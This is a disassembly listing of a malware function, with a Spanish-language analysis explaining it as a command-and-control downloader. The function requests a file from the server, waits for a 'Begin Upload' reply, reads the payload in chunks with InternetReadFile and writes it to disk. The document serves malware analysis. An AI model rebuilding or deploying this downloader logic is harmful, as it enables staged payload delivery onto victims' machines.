                             **************************************************************
                             *                          FUNCTION                          *
                             **************************************************************
                             undefined4 __stdcall FUN_0040133a(undefined4 param_1, ch
                               assume FS_OFFSET = 0xffdff000
             undefined4        EAX:4          <RETURN>
             undefined4        Stack[0x4]:4   param_1                                 XREF[5]:     004013b2(R),
                                                                                                   00401405(R),
                                                                                                   00401438(R),
                                                                                                   00401483(R),
                                                                                                   0040149d(R)
             char *            Stack[0x8]:4   param_2                                 XREF[5]:     00401344(R),
                                                                                                   004013eb(*),
                                                                                                   0040147b(*),
                                                                                                   00401488(R),
                                                                                                   00401490(*)
             int               Stack[0xc]:4   param_3                                 XREF[3]:     00401376(R),
                                                                                                   0040146d(W),
                                                                                                   0040148b(RW)
             undefined4        Stack[-0x8]:4  local_8                                 XREF[5]:     0040134b(W),
                                                                                                   004013ee(R),
                                                                                                   00401468(W),
                                                                                                   00401494(R),
                                                                                                   004014a2(R)
             undefined4        Stack[-0xc]:4  local_c                                 XREF[3]:     00401358(W),
                                                                                                   0040135d(W),
                                                                                                   004014aa(R)
             undefined4        Stack[-0x10]:4 local_10                                XREF[2]:     00401478(W),
                                                                                                   0040147f(R)
             undefined1        Stack[-0x404   local_404                               XREF[1]:     00401445(*)
             undefined1        Stack[-0x40f   local_40f                               XREF[1]:     004013e0(*)
             undefined1        Stack[-0x410   local_410                               XREF[3]:     004013d2(RW),
                                                                                                   004013f2(*),
                                                                                                   00401417(*)
             undefined1        Stack[-0x80f   local_80f                               XREF[1]:     00401370(*)
             undefined1        Stack[-0x810   local_810                               XREF[4]:     00401360(RW),
                                                                                                   0040137f(*),
                                                                                                   00401391(*),
                                                                                                   004013a7(*)
             undefined1        Stack[-0xc0f   local_c0f                               XREF[1]:     004013ca(*)
             undefined1        Stack[-0xc10   local_c10                               XREF[2]:     004013bf(RW),
                                                                                                   004013fe(*)
                             FUN_0040133a                                    XREF[1]:     FUN_004014f4:00401a4b(c)
        0040133a 55              PUSH       EBP
        0040133b 8b ec           MOV        EBP,ESP
        0040133d 81 ec 0c        SUB        ESP,0xc0c
                 0c 00 00
        00401343 53              PUSH       EBX
        00401344 8b 5d 0c        MOV        EBX,dword ptr [EBP + param_2]
        00401347 56              PUSH       ESI
        00401348 57              PUSH       EDI
        00401349 6a 5c           PUSH       0x5c                                             int _Ch for strrchr
        0040134b 89 4d fc        MOV        dword ptr [EBP + local_8],ECX
        0040134e 53              PUSH       EBX                                              char * _Str for strrchr
        0040134f ff 15 68        CALL       dword ptr [->MSVCRT.DLL::strrchr]                = 00002416
                 20 40 00
        00401355 59              POP        ECX
        00401356 40              INC        EAX
        00401357 59              POP        ECX
        00401358 89 45 f8        MOV        dword ptr [EBP + local_c],EAX
        0040135b 75 03           JNZ        LAB_00401360
        0040135d 89 5d f8        MOV        dword ptr [EBP + local_c],EBX
                             LAB_00401360                                    XREF[1]:     0040135b(j)
        00401360 80 a5 f4        AND        byte ptr [EBP + local_810],0x0
                 f7 ff ff 00
        00401367 be ff 00        MOV        ESI,0xff
                 00 00
        0040136c 8b ce           MOV        ECX,ESI
        0040136e 33 c0           XOR        EAX,EAX
        00401370 8d bd f5        LEA        EDI=>local_80f,[EBP + 0xfffff7f5]
                 f7 ff ff
        00401376 ff 75 10        PUSH       dword ptr [EBP + param_3]
        00401379 f3 ab           STOSD.REP  ES:EDI
        0040137b 66 ab           STOSW      ES:EDI
        0040137d aa              STOSB      ES:EDI
        0040137e 53              PUSH       EBX
        0040137f 8d 85 f4        LEA        EAX=>local_810,[EBP + 0xfffff7f4]
                 f7 ff ff
        00401385 68 20 31        PUSH       s_U-p-l-o-a-d-f-i-l-e%s******%d_00403120         char * _Format for sprintf
                 40 00
        0040138a 50              PUSH       EAX                                              char * _Dest for sprintf
        0040138b ff 15 64        CALL       dword ptr [->MSVCRT.DLL::sprintf]                = 0000240c
                 20 40 00
        00401391 8d 85 f4        LEA        EAX=>local_810,[EBP + 0xfffff7f4]
                 f7 ff ff
        00401397 50              PUSH       EAX                                              char * _Str for strlen
        00401398 e8 43 08        CALL       MSVCRT.DLL::strlen                               size_t strlen(char * _Str)
                 00 00
        0040139d 83 c4 14        ADD        ESP,0x14
        004013a0 8b 1d c8        MOV        EBX,dword ptr [->WININET.DLL::HttpSendRequestA]  = 0000231c
                 20 40 00
        004013a6 50              PUSH       EAX
        004013a7 8d 85 f4        LEA        EAX=>local_810,[EBP + 0xfffff7f4]
                 f7 ff ff
        004013ad 50              PUSH       EAX
        004013ae 6a 00           PUSH       0x0
        004013b0 6a 00           PUSH       0x0
        004013b2 ff 75 08        PUSH       dword ptr [EBP + param_1]
        004013b5 ff d3           CALL       EBX=>WININET.DLL::HttpSendRequestA
        004013b7 85 c0           TEST       EAX,EAX
        004013b9 0f 84 08        JZ         LAB_004014c7
                 01 00 00
        004013bf 80 a5 f4        AND        byte ptr [EBP + local_c10],0x0
                 f3 ff ff 00
        004013c6 8b ce           MOV        ECX,ESI
        004013c8 33 c0           XOR        EAX,EAX
        004013ca 8d bd f5        LEA        EDI=>local_c0f,[EBP + 0xfffff3f5]
                 f3 ff ff
        004013d0 f3 ab           STOSD.REP  ES:EDI
        004013d2 80 a5 f4        AND        byte ptr [EBP + local_410],0x0
                 fb ff ff 00
        004013d9 8b ce           MOV        ECX,ESI
        004013db 66 ab           STOSW      ES:EDI
        004013dd aa              STOSB      ES:EDI
        004013de 33 c0           XOR        EAX,EAX
        004013e0 8d bd f5        LEA        EDI=>local_40f,[EBP + 0xfffffbf5]
                 fb ff ff
        004013e6 f3 ab           STOSD.REP  ES:EDI
        004013e8 66 ab           STOSW      ES:EDI
        004013ea aa              STOSB      ES:EDI
        004013eb 8d 45 0c        LEA        EAX=>param_2,[EBP + 0xc]
        004013ee 8b 4d fc        MOV        ECX,dword ptr [EBP + local_8]
        004013f1 50              PUSH       EAX
        004013f2 8d 85 f4        LEA        EAX=>local_410,[EBP + 0xfffffbf4]
                 fb ff ff
        004013f8 68 ff 03        PUSH       0x3ff
                 00 00
        004013fd 50              PUSH       EAX
        004013fe 8d 85 f4        LEA        EAX=>local_c10,[EBP + 0xfffff3f4]
                 f3 ff ff
        00401404 50              PUSH       EAX
        00401405 ff 75 08        PUSH       dword ptr [EBP + param_1]
        00401408 e8 6f fc        CALL       FUN_0040107c                                     undefined4 FUN_0040107c(undefine
                 ff ff
        0040140d 84 c0           TEST       AL,AL
        0040140f 0f 84 b2        JZ         LAB_004014c7
                 00 00 00
        00401415 6a 0c           PUSH       0xc                                              size_t _MaxCount for _strnicmp
        00401417 8d 85 f4        LEA        EAX=>local_410,[EBP + 0xfffffbf4]
                 fb ff ff
        0040141d 68 10 31        PUSH       s_Begin_Upload_00403110                          char * _Str2 for _strnicmp
                 40 00
        00401422 50              PUSH       EAX                                              char * _Str1 for _strnicmp
        00401423 ff 15 a8        CALL       dword ptr [->MSVCRT.DLL::_strnicmp]              = 00002558
                 20 40 00
        00401429 83 c4 0c        ADD        ESP,0xc
        0040142c 85 c0           TEST       EAX,EAX
        0040142e 0f 85 93        JNZ        LAB_004014c7
                 00 00 00
        00401434 50              PUSH       EAX
        00401435 50              PUSH       EAX
        00401436 50              PUSH       EAX
        00401437 50              PUSH       EAX
        00401438 ff 75 08        PUSH       dword ptr [EBP + param_1]
        0040143b ff d3           CALL       EBX=>WININET.DLL::HttpSendRequestA
        0040143d 85 c0           TEST       EAX,EAX
        0040143f 0f 84 82        JZ         LAB_004014c7
                 00 00 00
        00401445 8d 85 00        LEA        EAX=>local_404,[EBP + 0xfffffc00]
                 fc ff ff
        0040144b 50              PUSH       EAX                                              char * _Str for atoi
        0040144c ff 15 84        CALL       dword ptr [->MSVCRT.DLL::atoi]                   = 0000245c
                 20 40 00
        00401452 8b f0           MOV        ESI,EAX
        00401454 8d 46 01        LEA        EAX,[ESI + 0x1]
        00401457 50              PUSH       EAX                                              uint param_1 for operator_new
        00401458 e8 9b 07        CALL       MSVCRT.DLL::operator_new                         void * operator_new(uint param_1)
                 00 00
        0040145d 59              POP        ECX
        0040145e 8b f8           MOV        EDI,EAX
        00401460 59              POP        ECX
        00401461 8b c6           MOV        EAX,ESI
        00401463 6a 0a           PUSH       0xa
        00401465 33 d2           XOR        EDX,EDX
        00401467 59              POP        ECX
        00401468 89 7d fc        MOV        dword ptr [EBP + local_8],EDI
        0040146b 8b d9           MOV        EBX,ECX
        0040146d 89 4d 10        MOV        dword ptr [EBP + param_3],ECX
        00401470 f7 f3           DIV        EBX
        00401472 8b 1d d8        MOV        EBX,dword ptr [->WININET.DLL::InternetReadFile]  = 000022cc
                 20 40 00
        00401478 89 45 f4        MOV        dword ptr [EBP + local_10],EAX
                             LAB_0040147b                                    XREF[1]:     0040148e(j)
        0040147b 8d 45 0c        LEA        EAX=>param_2,[EBP + 0xc]
        0040147e 50              PUSH       EAX
        0040147f ff 75 f4        PUSH       dword ptr [EBP + local_10]
        00401482 57              PUSH       EDI
        00401483 ff 75 08        PUSH       dword ptr [EBP + param_1]
        00401486 ff d3           CALL       EBX=>WININET.DLL::InternetReadFile
        00401488 03 7d 0c        ADD        EDI,dword ptr [EBP + param_2]
        0040148b ff 4d 10        DEC        dword ptr [EBP + param_3]
        0040148e 75 eb           JNZ        LAB_0040147b
        00401490 8d 45 0c        LEA        EAX=>param_2,[EBP + 0xc]
        00401493 50              PUSH       EAX
        00401494 8b 45 fc        MOV        EAX,dword ptr [EBP + local_8]
        00401497 2b c7           SUB        EAX,EDI
        00401499 03 c6           ADD        EAX,ESI
        0040149b 50              PUSH       EAX
        0040149c 57              PUSH       EDI
        0040149d ff 75 08        PUSH       dword ptr [EBP + param_1]
        004014a0 ff d3           CALL       EBX=>WININET.DLL::InternetReadFile
        004014a2 8b 7d fc        MOV        EDI,dword ptr [EBP + local_8]
        004014a5 68 0c 31        PUSH       _Mode_0040310c                                   char * _Mode for fopen
                 40 00
        004014aa ff 75 f8        PUSH       dword ptr [EBP + local_c]                        char * _Filename for fopen
        004014ad 80 24 37 00     AND        byte ptr [EDI + ESI*0x1],0x0
        004014b1 ff 15 78        CALL       dword ptr [->MSVCRT.DLL::fopen]                  = 0000243a
                 20 40 00
        004014b7 8b d8           MOV        EBX,EAX
        004014b9 59              POP        ECX
        004014ba 85 db           TEST       EBX,EBX
        004014bc 59              POP        ECX
        004014bd 75 0c           JNZ        LAB_004014cb
        004014bf 50              PUSH       EAX                                              FILE * _File for fclose
        004014c0 ff 15 74        CALL       dword ptr [->MSVCRT.DLL::fclose]                 = 00002430
                 20 40 00
        004014c6 59              POP        ECX
                             LAB_004014c7                                    XREF[4]:     004013b9(j), 0040140f(j),
                                                                                          0040142e(j), 0040143f(j)
        004014c7 32 c0           XOR        AL,AL
        004014c9 eb 22           JMP        LAB_004014ed
                             LAB_004014cb                                    XREF[1]:     004014bd(j)
        004014cb 53              PUSH       EBX                                              FILE * _File for fwrite
        004014cc 6a 01           PUSH       0x1                                              size_t _Count for fwrite
        004014ce 56              PUSH       ESI                                              size_t _Size for fwrite
        004014cf 57              PUSH       EDI                                              void * _Str for fwrite
        004014d0 ff 15 80        CALL       dword ptr [->MSVCRT.DLL::fwrite]                 = 00002452
                 20 40 00
        004014d6 53              PUSH       EBX                                              FILE * _File for fclose
        004014d7 ff 15 74        CALL       dword ptr [->MSVCRT.DLL::fclose]                 = 00002430
                 20 40 00
        004014dd 83 c4 14        ADD        ESP,0x14
        004014e0 85 ff           TEST       EDI,EDI
        004014e2 74 07           JZ         LAB_004014eb
        004014e4 57              PUSH       EDI                                              void * param_1 for operator_delete
        004014e5 e8 02 07        CALL       MSVCRT.DLL::operator_delete                      void operator_delete(void * para
                 00 00
        004014ea 59              POP        ECX
                             LAB_004014eb                                    XREF[1]:     004014e2(j)
        004014eb b0 01           MOV        AL,0x1
                             LAB_004014ed                                    XREF[1]:     004014c9(j)
        004014ed 5f              POP        EDI
        004014ee 5e              POP        ESI
        004014ef 5b              POP        EBX
        004014f0 c9              LEAVE
        004014f1 c2 0c 00        RET        0xc


La función FUN_0040133A implementa una rutina de descarga remota (C2) en la que el malware:

    Envía un mensaje al servidor solicitando un archivo,

    Espera confirmación (con una cadena como "Begin Upload"),

    Recibe el archivo por bloques usando InternetReadFile, y

    Lo guarda en disco.

🧠 Firma reconstruida (en C aproximado)

bool __stdcall FUN_0040133A(HINTERNET hRequest, char *remote_filename, int chunk_size);

🎯 Objetivo general

El malware solicita un archivo al C2 (como "Upload-file<payload>") y lo descarga y guarda localmente. Este comportamiento es típico de un downloader que recupera un nuevo componente o payload.
🔍 Paso a paso
1. Obtener nombre base del archivo

strrchr(remote_filename, '\\') + 1;

Obtiene solo el nombre del archivo sin la ruta, por ejemplo:

    Entrada: "C:\\malware\\payload.dll"

    Resultado: "payload.dll"

2. Preparar y enviar comando C2

sprintf("Upload-file%s******%d", filename, chunk_size);
HttpSendRequestA(...);

Envía un comando al C2 en el formato "Upload-fileX******Y" solicitando el archivo con nombre X y chunk size Y.
3. Esperar confirmación del servidor

FUN_0040107C(hRequest, ..., buffer, ...);
if (strncmp(buffer, "Begin Upload", 12) != 0) return false;

Llama a la función FUN_0040107C (que ya analizamos) para leer la respuesta del servidor entre <head>...</head>, y espera el mensaje "Begin Upload". Si no lo recibe, cancela la descarga.
4. Enviar segundo HttpSendRequestA para comenzar la transferencia

    Realiza una segunda petición HttpSendRequestA, ahora sin payload, solo para recibir los datos.

5. Leer tamaño del archivo

atoi(buffer);

Convierte el contenido de un buffer (local_404) a entero → tamaño del archivo en bytes.
6. Reservar memoria y preparar descarga

buffer = operator_new(size + 1);

Reserva memoria dinámica para recibir todo el archivo.
7. Leer datos con InternetReadFile

Lee el archivo en múltiples bloques, usando:

InternetReadFile(hRequest, dst, chunk_size, &read);

y lo hace en un bucle, hasta recibir todo el archivo.
8. Escribir archivo a disco

Después de recibir todo, el malware:

    Abre un archivo local con fopen(filename, "wb"),

    Escribe el contenido con fwrite(...),

    Libera la memoria con operator_delete,

    Cierra el archivo.

9. Valor de retorno

Devuelve true (AL = 1) si todo fue exitoso; de lo contrario, false (AL = 0).
✅ Conclusión
📦 Comportamiento resumido:

FUN_0040133A es una rutina de descarga remota controlada por el servidor:
Paso	Acción
1️⃣	Solicita un archivo al C2 con Upload-file<name>******<chunk_size>
2️⃣	Espera la confirmación "Begin Upload"
3️⃣	Recibe el archivo por bloques con InternetReadFile
4️⃣	Lo guarda en disco (nombre original)
🦠 En contexto de malware

Esta función es usada para:

    Descargar un payload adicional (como DLLs, troyanos o herramientas).

    Guardarlo como un archivo ejecutable para que otro componente lo ejecute.

    Es muy común en malware modular y malware en fases.
